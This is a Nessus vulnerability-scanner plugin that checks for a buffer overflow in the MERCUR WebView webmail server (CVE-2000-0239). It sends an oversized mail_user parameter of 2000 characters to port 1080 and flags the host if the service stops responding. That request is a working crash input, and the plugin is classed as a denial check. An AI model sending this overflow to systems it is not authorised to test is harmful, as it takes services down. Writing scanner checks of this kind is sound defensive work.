#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10346);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2000-0239");
 script_bugtraq_id(1056);
 script_xref(name:"OSVDB", value:"10887");

 script_name(english:"MERCUR WebView WebMail Server mail_user Parameter DoS");
 script_summary(english:"Checks for a buffer overflow");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application on the remote host has a buffer overflow\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote WebView service does not do proper bounds checking when\n",
     "processing the following request :\n\n",
     "  GET /mmain.html&mail_user=aaa[...]aaa\n\n",
     "A remote attacker could exploit this to crash the service, or\n",
     "potentially execute arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2000-03/0160.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "httpver.nasl");
 script_require_ports(1080);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("http_func.inc");

if (report_paranoia < 2) exit(0);

port = 1080;

if(get_port_state(port))
{
 soc = http_open_socket(port);
 if(soc)
 {
  # check it's a web-server first
  req = http_get(item:"/", port:port);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  if(!r)exit(0);
  if(!("HTTP" >< r))exit(0);
  
  soc2 = http_open_socket(port);
  if(soc2)
  {
   req2 = string("/mmain.html&mail_user=", crap(2000));
   req2 = http_get(item:req2, port:port);
   send(socket:soc2, data:req2);
   r2 = http_recv(socket:soc2);
   http_close_socket(soc2);
   if(!r2)security_hole(port);
  }
 }
}
